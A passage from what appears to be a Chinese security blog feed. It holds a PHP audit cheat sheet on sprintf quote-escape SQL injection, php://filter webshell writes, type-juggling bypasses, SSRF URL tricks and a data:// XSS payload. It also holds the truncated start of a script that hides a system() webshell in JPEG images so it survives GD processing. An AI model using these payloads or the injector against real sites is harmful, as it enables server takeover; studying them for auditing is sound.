id="2-格式化字符串导致的单引号逃逸"><a href="#2-格式化字符串导致的单引号逃逸" class="headerlink" title="2.格式化字符串导致的单引号逃逸"></a>2.格式化字符串导致的单引号逃逸</h4><p>再来分析一下前段时间出来的wordpress格式化字符导致的注入</p><p>具体的代码分析在这就不贴图了，我们直接来分析一下格式化字符串漏洞的核心原理，其中一个关键点就是sprintf的padding特性</p><p>printf（）和sprintf（）函数中可以通过使用%接一个字符来进行padding功能</p><p>例如%10s 字符串会默认在左侧填充空格至长度为10，还可以 %010s 会使用字符0进行填充，但是如果我们想要使用别的字符进行填充，需要使用 ‘ 单引号进行标识，例如 %’#10s 这个就是使用#进行填充（百分号不仅会吃掉’单引号，还会吃掉 斜杠）</p><p>同时sprintf（）可以使用指定参数位置的写法</p><p>%后面的数字代表第几个参数，$后代表格式化类型</p><p>于是当我们输入的特殊字符被放到引号中进行转义时，但是又使用了sprintf函数进行拼接时,例如%1$’%s’ 中的 ‘%被当成使用%进行padding，导致后一个’逃逸了</p><p>还有一种情况就是’被转义成了’,例如输入%’ and 1=1#进入，存在SQL过滤，’被转成了\’<br>于是sql语句变成了select * from user where username = ‘%\’ and 1=1#’;<br>如果这个语句被使用sprintf函数进行了拼接，%后的被吃掉了，导致了’逃逸</p><pre><code>&lt;?php$sql = &quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args ) ;//result: select * from user where username = &apos;&apos; and 1=1#&apos;?&gt;</code></pre><p>不过这样容易遇到 PHP Warning: sprintf(): Too few arguments的报错<br>这个时候我们可以使用%1$来吃掉转移添加的\</p><pre><code>&lt;?php$sql = &quot;select * from user where username = &apos;%1$\&apos; and 1=1#&apos; and password=&apos;%s&apos;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args) ;//result: select * from user where username = &apos;&apos; and 1=1#&apos; and password=&apos;admin&apos;;?&gt;</code></pre><h1 id="0x03-php安全"><a href="#0x03-php安全" class="headerlink" title="0x03 php安全"></a>0x03 php安全</h1><h2 id="strcmp-弱类型比较特性"><a href="#strcmp-弱类型比较特性" class="headerlink" title="strcmp 弱类型比较特性"></a>strcmp 弱类型比较特性</h2><p>strcmp是C与PHP中常用的一个函数，用来比较两个字符串是否相等。如果二者相等，则返回数字0，否则返回其他数字。 strcmp函数当我们传入一个数组和一个字符串时，将会触发一个警告，函数返回FALSE。由于PHP弱类型的特性，FASLE == 0，会让系统误认为返回的值是0，最后绕过strcmp函数的判断。</p><h2 id="Linux-PHP-写入与删除文件差异特性"><a href="#Linux-PHP-写入与删除文件差异特性" class="headerlink" title="Linux PHP 写入与删除文件差异特性"></a>Linux PHP 写入与删除文件差异特性</h2><p>有时候目标网站存在任意文件上传漏洞，但操作执行完成后即刻删除，导致我们的webshell无法保留在服务器上。这种情况多存在于一些有缓存文件、临时文件的逻辑中，在实战里经常遇到。 Linux下，php的文件写入与移动删除等操作中，由于对于路径的处理存在差异，在有上述情况存在时，我们可以通过传入文件名为shell.php/.的文件，绕过删除函数。</p><h2 id="preg-replace-利用-0-截断执行代码"><a href="#preg-replace-利用-0-截断执行代码" class="headerlink" title="preg_replace 利用 \0 截断执行代码"></a>preg_replace 利用 \0 截断执行代码</h2><p>有些情况下，我们可控preg_replace的第一个参数（正则表达式）中的部分内容。 在PHP5.4.7以前，preg_replace的第一个参数可以利用\0进行截断，并将正则模式修改为e。众所周知，e模式的正则支持执行代码，此时将可构造一个任意代码执行漏洞。</p><h2 id="利用php-filter流绕过死亡exit"><a href="#利用php-filter流绕过死亡exit" class="headerlink" title="利用php filter流绕过死亡exit"></a>利用php filter流绕过死亡exit</h2><p>很多开发者在写入缓存、日志、配置文件的时候，通过在文件开头增加&lt;?php exit; ?&gt;。此时，即使用户控制文件内容，也无法执行。 我们可以利用PHP的filter流，通过php://filter/write=string.strip_tags|convert.base64-decode/resource=config.php来写入文件。 此时，PHP会先用strip_tags去除死亡exit，再将webshell用base64-decode还原，最终写入的文件中不再有死亡exit。</p><h2 id="filter-var-FILTER-VALIDATE-EMAIL-绕过"><a href="#filter-var-FILTER-VALIDATE-EMAIL-绕过" class="headerlink" title="filter_var FILTER_VALIDATE_EMAIL 绕过"></a>filter_var FILTER_VALIDATE_EMAIL 绕过</h2><p>filter_var是一组PHP中过滤、检测用户输入的方法，其中开发者通常利用filter_var($email, FILTER_VALIDATE_EMAIL)来过滤用户输入的邮箱。 RFC 3696规定邮箱local part部分可以用双引号包裹，双引号内即可填入任意字符。 我们可以利用RFC 3696，传入”aaa’aaa”@example.com，即可保留单引号，并通过filter_var的检测，最终触发SQL注入漏洞。</p><h2 id="控制Nginx虚拟主机的Host"><a href="#控制Nginx虚拟主机的Host" class="headerlink" title="控制Nginx虚拟主机的Host"></a>控制Nginx虚拟主机的Host</h2><p>在同一服务器上运行多个网站，Nginx会根据HTTP数据包中的Host头来区分用户访问的是哪个网站。我们如果修改Host头的值，将不能进入指定的网站。 此时，我们可以借助Nginx特性，用如下两个方法在$_SERVER[‘HTTP_HOST’]中注入恶意代码： 1. 在存在两个Host头时，Nginx取到的是第1个，PHP中取到的是第2个。我们将恶意代码放在第2个位置，将可控制$_SERVER[‘HTTP_HOST’] 2. Nginx在处理Host时，会将Host用冒号分割成hostname和port，port部分被丢弃。所以，将恶意代码放在port位置，即可部分控制$_SERVER[‘HTTP_HOST’]</p><h2 id="利用GBK编码吃反引号"><a href="#利用GBK编码吃反引号" class="headerlink" title="利用GBK编码吃反引号"></a>利用GBK编码吃反引号</h2><p>在开启GPC或模拟全局GPC的CMS中，我们传入的单引号（’）和转义符（\）等将被用一个转义符（\）进行转义，导致我们无法闭合单引号进行注入。 在GBK编码的程序中，部分开发者会用iconv将字符串转换编码后存入数据库。在这种情况下，我们可以利用GBK编码中的0xE55C，转义正常的反斜线，绕过全局GPC进行注入。</p><h2 id="iconv-绕过上传白名单"><a href="#iconv-绕过上传白名单" class="headerlink" title="iconv()绕过上传白名单"></a>iconv()绕过上传白名单</h2><p>在上传文件的过程中，如果目标使用的字符编码和访客操作系统使用的字符编码不同，可能导致上传后的文件名出现乱码。所以，开发者在获取文件名后，通常调用iconv()对其进行编码转换。 如果转换编码的操作在验证文件名后缀操作之后，那么我们可以利用iconv()特性，截断文件名，进而去除白名单中的后缀，造成文件上传漏洞。</p><h2 id="PHP-mt-rand-随机数预测"><a href="#PHP-mt-rand-随机数预测" class="headerlink" title="PHP mt_rand() 随机数预测"></a>PHP mt_rand() 随机数预测</h2><p>mt_rand()生成随机数有如下特点： 1. PHP &gt; 4.2.0中，系统会自动设置随机数种子，相同种子生成的随机数相同 2. 同一进程中，如果多次调用mt_rand()函数，只会自动播种一次 所以，如果同一次我们生成了数个随机数，在知道其中一部分的情况下，即可反推随机数种子。 32位系统中，种子最大值为2^16-1，64位系统中，种子最大值为2^31-1。我们爆破到该种子，即可预测其他未知的随机数。<br><a href="https://mp.weixin.qq.com/s/3TgBKXHw3MC61qIYELanJg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/3TgBKXHw3MC61qIYELanJg</a></p><h2 id="PHP5-rand-随机数预测"><a href="#PHP5-rand-随机数预测" class="headerlink" title="PHP5 rand() 随机数预测"></a>PHP5 rand() 随机数预测</h2><p>PHP5 rand()函数使用了glibc库中的rand()函数，glibc中维护了一个随机数链，其上下文中存在如下关系： state[i] = state[i-3] + state[i-31] return state[i] &gt;&gt; 1 进而导致PHP5中的rand()函数生成的随机数也存在上述关系。如果开发者使用rand()函数生成密钥、salt等安全相关元素，将导致被预测。</p><h2 id="利用json-encode吃转义符"><a href="#利用json-encode吃转义符" class="headerlink" title="利用json_encode吃转义符"></a>利用json_encode吃转义符</h2><p>在开启GPC或模拟全局GPC的CMS中，我们传入的单引号（’）和转义符（\）等将被用一个转义符（\）进行转义，导致我们无法闭合单引号进行注入。 部分开发者会将一些结构复杂内容（如数组）用json_encode编码成一个字符串后存入数据库，在这种情况下，我们可以绕过全局GPC进行注入</p><h2 id="file-put-contents写入文件绕过内容黑名单"><a href="#file-put-contents写入文件绕过内容黑名单" class="headerlink" title="file_put_contents写入文件绕过内容黑名单"></a>file_put_contents写入文件绕过内容黑名单</h2><p>在开发者使用file_put_contents写入文件的时候，有的情况下会用字符串匹配的方式拦截如“&lt;”、”&gt;”、”?”等字符，导致我们无法写入webshell。 file_put_contents函数第二个参数支持传入数组，用户传入的数组将被拼接成一个字符串写入文件。数组因为类型不同导致无法使用字符串匹配来检测，进而利用这种方式绕过了黑名单。</p><h2 id="PHP-MD5-比较的陷阱"><a href="#PHP-MD5-比较的陷阱" class="headerlink" title="PHP MD5 比较的陷阱"></a>PHP MD5 比较的陷阱</h2><p>PHP是一门弱类型语言，在使用“==”进行变量比较的时候，会先进行类型转换，再进行比较操作。即使比较的是两个字符串，如果二者满足“科学计数法”的表达方法，也会先转换成数字再进行比较。 比如： var_dump(“0e1234” == “0e5678”); 其返回结果是true。 在比较md5时，如果目标密码的md5值恰好是“0e”+数字，将可以出现密码绕过漏洞。</p><h2 id="PHP-5-6-11-数组比较Bug"><a href="#PHP-5-6-11-数组比较Bug" class="headerlink" title="PHP 5.6.11 数组比较Bug"></a>PHP 5.6.11 数组比较Bug</h2><p>PHP 5.6.11/5.5.27/5.4.44以前的版本中，存在一处数组比较的Bug（Bug #69892），我们可以通过 var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]); 来复现该特性。</p><h1 id="0x04-代码审计关注点）"><a href="#0x04-代码审计关注点）" class="headerlink" title="0x04 代码审计关注点）"></a>0x04 代码审计关注点）</h1><h2 id="file-put-contents、copy、file-get-contents等读取写入操作与unlink、file-exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过"><a href="#file-put-contents、copy、file-get-contents等读取写入操作与unlink、file-exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过" class="headerlink" title="file_put_contents、copy、file_get_contents等读取写入操作与unlink、file_exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过"></a>file_put_contents、copy、file_get_contents等读取写入操作与unlink、file_exists等删除判断文件函数之间对于路径处理的差异导致的删除绕过</h2><pre><code>&lt;?php$filename = __DIR__ . &apos;/tmp/&apos; . $user[&apos;name&apos;];$data = $user[&apos;info&apos;];file_put_contents($filename, $data);if (file_exists($filename)) {    unlink($filename);}?&gt;</code></pre><blockquote><p>查看php源码，其实我们能发现，php读取、写入文件，都会调用php_stream_open_wrapper_ex来打开流，而判断文件存在、重命名、删除文件等操作则无需打开文件流。<br>我们跟一跟php_stream_open_wrapper_ex就会发现，其实最后会使用tsrm_realpath函数来将filename给标准化成一个绝对路径。而文件删除等操作则不会，这就是二者的区别。<br> 所以，如果我们传入的是文件名中包含一个不存在的路径，写入的时候因为会处理掉“../”等相对路径，所以不会出错；判断、删除的时候因为不会处理，所以就会出现“No such file or directory”的错误。</p></blockquote><p>于是乎linux可以通过xxxxx/../test.php、test.php/. windows可以通过test.php:test test.ph&lt;来绕过文件删除,此外发现还可以使用伪协议php://filter/resource=1.php在file_ge_contents、copy等中读取文件内容，却可以绕过文件删除</p><h2 id="extract-、parse-str-等变量覆盖"><a href="#extract-、parse-str-等变量覆盖" class="headerlink" title="extract()、parse_str() 等变量覆盖"></a>extract()、parse_str() 等变量覆盖</h2><p>extract函数从数组导入变量（如\$_GET、 \$_POST）,将数组的键名作为变量的值。而parse_str函数则是从类似name=Bill&amp;age=60的格式字符串解析变量.如果在使用第一个函数没有设置EXTR_SKIP或者EXTR_PREFIX_SAME等处理变量冲突的参数时、第二个函数没有使用数组接受变量时将会导致变量覆盖的问题</p><h2 id="intval-整数溢出、向下取整和整形判断的问题"><a href="#intval-整数溢出、向下取整和整形判断的问题" class="headerlink" title="intval()整数溢出、向下取整和整形判断的问题"></a>intval()整数溢出、向下取整和整形判断的问题</h2><pre><code>32位系统最大的带符号范围为-2147483648 到 2147483647，64位最大的是 9223372036854775807</code></pre><p>​ 因此，在32位系统上 intval(‘1000000000000’) 会返回 2147483647</p><pre><code>此外intval(10.99999)会返回10，intval和int等取整都是’截断’取整，并不是四舍五入intval函数进去取整时，是直到遇上数字或者正负号才开始进行转换，之后在遇到非数字或者结束符号（\0）时结束转换</code></pre><h2 id="浮点数精度问题导致的大小比较问题"><a href="#浮点数精度问题导致的大小比较问题" class="headerlink" title="浮点数精度问题导致的大小比较问题"></a>浮点数精度问题导致的大小比较问题</h2><p>当小数小于10^-16后，PHP对于小数就大小不分了<br>var_dump(1.000000000000000 == 1) &gt;&gt; TRUE<br>var_dump(1.0000000000000001 == 1) &gt;&gt; TRUE</p><h2 id="is-numeric-与intval-特性差异"><a href="#is-numeric-与intval-特性差异" class="headerlink" title="is_numeric()与intval()特性差异"></a>is_numeric()与intval()特性差异</h2><pre><code>is_numeric函数在判断是否是数字时会忽略字符串开头的’ ‘、’\t’、’\n’、’\r’、’\v’、’\f’。</code></pre><p>​ 而’.’可以出现在任意位置，E、e能出现在参数中间，仍可以被判断为数字。也就是说is_numeric(“\r\n\t 0.1e2”) &gt;&gt; TRUE</p><pre><code>intval()函数会忽略’’ ‘\n’、’\r’、’\t’、’\v’、’\0’ ，也就是说intval(“\r\n\t 12”) &gt;&gt; 12</code></pre><h2 id="strcmp-数组比较绕过"><a href="#strcmp-数组比较绕过" class="headerlink" title="strcmp()数组比较绕过"></a>strcmp()数组比较绕过</h2><p>int strcmp ( string $ str1 , string \$str2 )</p><p>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0；</p><p>如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p><p>但是如果传入的两个变量是数组的话，函数会报错返回NULL，如果只是用strcmp()==0来判断的话就可以绕过</p><h2 id="sha1-、md5-函数传入数组比较绕过"><a href="#sha1-、md5-函数传入数组比较绕过" class="headerlink" title="sha1()、md5() 函数传入数组比较绕过"></a>sha1()、md5() 函数传入数组比较绕过</h2><p>sha1（） MD5（）函数默认接收的参数是字符串类型，但是如果如果传入的参数是数组的话，函数就会报错返回NULL。类似sha1(\$_GET[‘name’]) === sha1(\$_GET[‘password’])的比较就可以绕过</p><h2 id="弱类型-比较绕过"><a href="#弱类型-比较绕过" class="headerlink" title="弱类型==比较绕过"></a>弱类型==比较绕过</h2><p>这方面问题普及的很多，不作过多的解释</p><pre><code>md5(‘240610708’); // 0e462097431906509019562988736854md5(‘QNKCDZO’); // 0e830400451993494058024219903391md5(‘240610708’) == md5(‘QNKCDZO’)md5(‘aabg7XSs’) == md5(‘aabC9RqS’)sha1(‘aaroZmOk’) == sha1(‘aaK1STfY’)sha1(‘aaO8zKZF’) == sha1(‘aa3OFF9m’)‘0010e2’ == ‘1e3’‘0x1234Ab’ == ‘1193131‘‘0xABCdef’ == ‘ 0xABCdef’当转换为boolean时，以下只被认为是FALSE：FALSE、0、0.0、“”、“0”、array()、NULLPHP 7 以前的版本里，如果向八进制数传递了一个非法数字（即 8 或 9），则后面其余数字会被忽略。var_dump(0123)=var_dump(01239)=83PHP 7 以后，会产生 Parse Error。字符串转换为数值时，若字符串开头有数字，则转为数字并省略后面的非数字字符。若一开头没有数字则转换为0\$foo = 1 + “bob-1.3e3”; // $foo is integer (1)\$foo = 1 + “bob3”; // $foo is integer (1)\$foo = 1 + “10 Small Pigs”; // $foo is integer (11)‘’ == 0 == false‘123’ == 123‘abc’ == 0‘123a’ == 123‘0x01’ == 1‘0e123456789’ == ‘0e987654321’[false] == [0] == [NULL] == [‘’]NULL == false == 0» true == 1</code></pre><h2 id="eregi-匹配绕过"><a href="#eregi-匹配绕过" class="headerlink" title="eregi()匹配绕过"></a>eregi()匹配绕过</h2><p>eregi（）默认接收字符串参数，如果传入数组，函数会报错并返回NULL。同时还可以%00 截断进行绕过</p><h2 id="PHP变量名不能带有点-和空格，否则在会被转化为下划线"><a href="#PHP变量名不能带有点-和空格，否则在会被转化为下划线" class="headerlink" title="PHP变量名不能带有点[.] 和空格，否则在会被转化为下划线[_]"></a>PHP变量名不能带有点[.] 和空格，否则在会被转化为下划线[_]</h2><pre><code>parse_str(&quot;na.me=admin&amp;pass wd=123&quot;,$test);var_dump($test); array(2) {  [&quot;na_me&quot;]=&gt;  string(5) &quot;admin&quot;  [&quot;pass_wd&quot;]=&gt;  string(3) &quot;123&quot;}</code></pre><p>PS：通过$_SERVER[‘REQUEST_URI’]方式获得的参数不会进行转换</p><h2 id="REQUEST是直接从GET，POST-和-COOKIE中取值，不是他们的引用。即使后续GET，POST-和-COOKIE发生了变化，也不会影响-REQUEST的结果"><a href="#REQUEST是直接从GET，POST-和-COOKIE中取值，不是他们的引用。即使后续GET，POST-和-COOKIE发生了变化，也不会影响-REQUEST的结果" class="headerlink" title="\$_REQUEST是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续GET，POST 和 COOKIE发生了变化，也不会影响$_REQUEST的结果"></a>\$_REQUEST是直接从GET，POST 和 COOKIE中取值，不是他们的引用。即使后续GET，POST 和 COOKIE发生了变化，也不会影响$_REQUEST的结果</h2><p>php在遇到相同参数时接受的是第二个参数<br>in_arrary()函数默认进行松散比较（进行类型转换）</p><pre><code>in_arrary(“1asd”,arrart(1,2,3,4))    =&gt; truein_arrary(“1asd”,arrart(1,2,3,4),TRUE)    =&gt; false   \\(需要设置strict参数为true才会进行严格比较，进行类型检测)</code></pre><p>htmlspecialchars()函数默认只转义双引号不转义单引号，如果都转义的话需要添加上参数ENT_QUOTES<br>在php4、php&lt;5.2.1中，变量的key值不受magic_quotes_gpc影响<br>sprintf()格式化漏洞（可以吃掉转义后的单引号）<br>printf（）和sprintf（）函数中可以通过使用%接一个字符来进行padding功能<br>例如%10s 字符串会默认在左侧填充空格至长度为10，还可以 %010s 会使用字符0进行填充，但是如果我们想要使用别的字符进行填充，需要使用 ‘ 单引号进行标识，例如 %’#10s 这个就是使用#进行填充（百分号不仅会吃掉’单引号，还会吃掉\ 斜杠）<br>同时sprintf（）可以使用指定参数位置的写法</p><pre><code>&lt;?php$format  = &apos;This %2$s contains %1$04d monkeys&apos;;echo sprintf($format,$num,$location);?&gt;以上实例会输出:The tree contains 0005 monkeys</code></pre><p>%后面的数字代表第几个参数，$后代表格式化类型<br>于是当我们输入的特殊字符被放到引号中进行转义时，但是又使用了sprintf函数进行拼接时<br>例如%1$’%s’ 中的 ‘%被当成使用%进行padding，导致后一个’逃逸了<br>还有一种情况就是’被转义成了\’,例如输入%’ and 1=1#进入，存在SQL过滤，’被转成了\’<br>于是sql语句变成了 select * from user where username = ‘%\’ and 1=1#’;<br>如果这个语句被使用sprintf函数进行了拼接，%后的\被吃掉了，导致了’逃逸</p><pre><code>&lt;?php$sql = &quot;select * from user where username = &apos;%\&apos; and 1=1#&apos;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args ) ;//result: select * from user where username = &apos;&apos; and 1=1#&apos;?&gt;</code></pre><p>不过这样容易遇到 PHP Warning: sprintf(): Too few arguments的报错<br>这个时候我们可以使用%1$来吃掉转移添加的\</p><pre><code>&lt;?php$sql = &quot;select * from user where username = &apos;%1$\&apos; and 1=1#&apos; and password=&apos;%s&apos;;&quot;;$args = &quot;admin&quot;;echo sprintf( $sql, $args) ;//result: select * from user where username = &apos;&apos; and 1=1#&apos; and password=&apos;admin&apos;;?&gt;</code></pre><h2 id="php中-赋值运算的优先级高于and"><a href="#php中-赋值运算的优先级高于and" class="headerlink" title="php中 = 赋值运算的优先级高于and"></a>php中 = 赋值运算的优先级高于and</h2><p>$c = is_numeric($a) and is_numeric($b) 程序本意是要a、b都为数字才会继续，但是当\$a为数字时，会先赋值给\$c，所以可能导致$b绕过检测</p><h2 id="parse-url与libcurl对与url的解析差异可能导致ssrf"><a href="#parse-url与libcurl对与url的解析差异可能导致ssrf" class="headerlink" title="parse_url与libcurl对与url的解析差异可能导致ssrf"></a>parse_url与libcurl对与url的解析差异可能导致ssrf</h2><pre><code>当url中有多个@符号时，parse_url中获取的host是最后一个@符号后面的host，而libcurl则是获取的第一个@符号之后的。因此当代码对http://user@eval.com:80@baidu.com 进行解析时，PHP获取的host是baidu.com是允许访问的域名，而最后调用libcurl进行请求时则是请求的eval.com域名，可以造成ssrf绕过此外对于https://evil@baidu.com这样的域名进行解析时,php获取的host是`evil@baidu.com`，但是libcurl获取的host却是evil.com</code></pre><h2 id="url标准的灵活性导致绕过filter-var与parse-url进行ssrf"><a href="#url标准的灵活性导致绕过filter-var与parse-url进行ssrf" class="headerlink" title="url标准的灵活性导致绕过filter_var与parse_url进行ssrf"></a>url标准的灵活性导致绕过filter_var与parse_url进行ssrf</h2><p>filter_var()函数对于<a href="http://evil.com;google.com" target="_blank" rel="noopener">http://evil.com;google.com</a> 会返回false也就是认为url格式错误，但是对于0://evil.com:80;google.com:80/ 、0://evil.com:80,google.com:80/、0://evil.com:80\google.com:80/却返回true。</p><h2 id="通过file-get-contents获取网页内容并返回到客户端有可能造成xss"><a href="#通过file-get-contents获取网页内容并返回到客户端有可能造成xss" class="headerlink" title="通过file_get_contents获取网页内容并返回到客户端有可能造成xss"></a>通过file_get_contents获取网页内容并返回到客户端有可能造成xss</h2><p>例如如下代码</p><pre><code>if(filter_var($argv[1], FILTER_VALIDATE_URL)) {   // parse URL   $r = parse_url($argv[1]);   print_r($r);   // check if host ends with google.com   if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) {      // get page from URL      $a = file_get_contents($argv[1]);      echo($a);   } else {      echo &quot;Error: Host not allowed&quot;;   }} else {   echo &quot;Error: Invalid URL&quot;;}</code></pre><p>虽然通过filter_var函数对url的格式进行检查，并且使用正则对url的host进行限定<br>但是可以通过<code>data://baidu.com/plain;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pgo=</code>页面会将<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>返回给客户端，就有可能造成xss</p><h2 id="序列化漏洞常见的魔法函数"><a href="#序列化漏洞常见的魔法函数" class="headerlink" title="序列化漏洞常见的魔法函数"></a>序列化漏洞常见的魔法函数</h2><p>construct():当一个类被创建时自动调用<br>destruct():当一个类被销毁时自动调用<br>invoke():当把一个类当作函数使用时自动调用<br>tostring():当把一个类当作字符串使用时自动调用<br>wakeup():当调用unserialize()函数时自动调用<br>sleep():当调用serialize()函数时自动调用<br>__call():当要调用的方法不存在或权限不足时自动调用</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;0x01-PHP敏感配置项&quot;&gt;&lt;a href=&quot;#0x01-PHP敏感配置项&quot; class=&quot;headerlink&quot; title=&quot;0x01 PHP敏感配置项&quot;&gt;&lt;/a&gt;0x01 PHP敏感配置项&lt;/h1&gt;&lt;h2 id=&quot;register-globals-php版
      
    
    </summary>
    
    
      <category term="php" scheme="https://threst.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>phpgd绕过</title>
    <link href="https://threst.github.io/2018/10/04/phpgd%E7%BB%95%E8%BF%87/"/>
    <id>https://threst.github.io/2018/10/04/phpgd绕过/</id>
    <published>2018-10-04T05:34:11.000Z</published>
    <updated>2018-10-04T07:05:11.076Z</updated>
    
    <content type="html"><![CDATA[<h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs "Something's wrong".</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    $miniPayload = <span class="string">'&lt;?=system($_GET[c]);?&gt;'</span>;</span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">'gd'</span>) || !function_exists(<span class="string">'imagecreatefromjpeg'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php-gd is not installed'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    set_error_handler(<span class="string">"custom_error_handler"</span>);</span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="keyword">TRUE</span>;</span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Incorrect SOI marker'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                $startPos = $dis-&gt;seek();</span><br><span class="line">                $outStreamTmp = </span><br><span class="line">                    substr($outStream, <span class="number">0</span>, 